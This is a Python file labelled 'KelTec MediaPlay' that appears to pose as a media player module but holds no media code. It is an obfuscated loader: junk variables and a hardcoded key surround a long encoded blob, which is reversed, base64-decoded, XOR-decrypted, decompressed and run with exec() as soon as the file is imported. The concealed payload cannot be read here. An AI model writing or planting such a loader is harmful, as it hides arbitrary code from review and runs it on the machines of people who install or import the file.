# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 572614 ^ 895161
_lx1_1 = len("e5e728")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-499758)
_lx3_3 = 793363 * 0
_lx4_4 = 610733 ^ 845415
_K = 'ee1a5e84329ea068282407c902a844cd3725f6ee6585df989ac3c8190281e59b'
_M = 'uNRhNGBeEYIIzc++TinRpRDwGpv7VYdVBcHZsYabv6LohjJrIwhSxAbBxr9MK9qtE6dLzaNd1AgHktq/0Jzqpb2GZzgnXw/DCsiQ'
_D = '==wpoIocsU+qoyM5TOgdqBuKe7MXcm0wTYWX72cZmNmVvu30RCEYLyFHWAzf489w09h0u8VIb7TF8eCW3ItLs8nsR5FQXkWpnTmrynRzW8tLop2SUXy7XqF8+6+dS/bo1ygFEJzmWr67yI0LnCJFsFVgwU7O8R23m2FRDEJM2AupBt4/y9AWP1uSke93jnNFFYchx9AqgIm+z3LY1ncgjut1lOQaW7ySigfHycZqj0iNyjByof+IaRVmP7qtJsnkd5nW/ZvgQO9If0+EF7oZ4CO6chzBXAM9SLH0pPa6Tk4r0Xv7baY9awRGYzXa+L+EjkQ1ybqSunLKrnmrst+HHLo0bNgECDZGohkl0RWhLjGMTaRvJwbalyKddXEX+tVWxlbkrU4nOXHgZgk92HsK70k6g3zjUOSPiV5mjcm927NIrPk6faZbxuhpYxxiAFAi90i0m6FVVb3rcQmwrQahoxKkhAdadpnRjjagdz2dtyHsUgorwjidv/Wl72wwCBUIgtA7XmWriNyX6stRm7vs40JpGXA+lgE/8/pagnXKTAseBjDq8SO87gNw9APtpxI1WXWUfRhzqtDVu4V3nClYZvFmCVCvuI5vfp1dzlvz6zqgyNSC7EBptCbM/wznY7rKz0T4Y7FWJvn8LVVBwpGCoOu1vzQV3fwZD3N+/24XVL4myeDM12GDQzUUg7pfNq5zs8kaNHcetZfRdnLdv6TUh7wR26N34wn8qy05LprIz11dVpftF5p+HeiFaotflDlB0H17vi1aJp6M3yNcMpW4+WAunxR0Yhw/f4O/mhR/9A37/W0oGOpdlasUf0SUCiELvFIeSFKywrONsBI4aic93q3onmpGi7T9bi3ykXvKNFBpDs2Q9eI139Tnoq0HXaWW3ssk2Qj+UG48z+KUau3/sBt2qw0oKRn9+FocVRe8nulqxHvUi/3NKzlXV+QJTTi00OixRbM5xaZgaXKllm2MmYHAv6X8hpcwCQ+kXZgnnofDDSNMuVKTuB3G45NFF6W/qqRip6QKLfpRewgRLGht6IbWuYDKJpxR1yRA5shIyKKqiBeq5HUJDgL1ZMjWtV7rcG8XCxnCRNXLc3r0uFp4BdKOd5BdQEMFJLCWJreWTFrL4U/cyeEjpFyqoVELWomYMUD/WsBx3Pi9tNEqCbRK06vzShNjBsWN5g9VgygvtQAiK84bgmuDs5UJjaR1qE1p7+232wuyzw0RxGiPE7GjEgmyLPw/3yGj7kqbVpNAM5eeqit6cCLzUb8VD//sM31BcD+ADD74tmpEwAmEZNMDshAXuHs5LMNE5zAaddrG2K2L6nFT31JnIO5iWfwH+LKohbT1TZDNO6ipGrbHXU+QrmtHBrHRvRIW2k+eDN8bc0NG0Tw18kfO5+svPc5ZeCtk3bQtiYT4x6LPQa4rms7pFgxaiiYg/sU5wSBTlkdXl8WXWqJt5+jQ4zOB9JFajqsUirK5nyQxyleqKdbqBJQpw0T9cyYz90MjxWMlrvhWg6Q3IvHi3MVD9Z3ZAWiIbu5Wxvzp/Jaa/gXKvalgIj2rVrOG+HfGUXpD6jInC1AECSq0GpEB1JHkoxWr5pI0Vrkj8GRCgnNz/knyjx4v1IyA5SZoWhSd0wlz5EqENcgxNe58K4v4Ma/U+PBwAHiaAPNn8vQCpd8IS8M0Q5C1Nc82+6ZELSonB/P3pRpma73sYjCDS7Drv3HFFA7GoTHsRgS4AYZYbwf1HJaebiHa0mKQ3TcpQEcO6hSf4MqlB4hf0Sh0ENHD7st77vetVrx9mmehuOfiCBjFUaFbPchTEsWCNZq6ivjq7IuVoU5XpvPbFnW35WKltNizXqY1eLGHzteCPbzXInxSqgNOvjDb'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})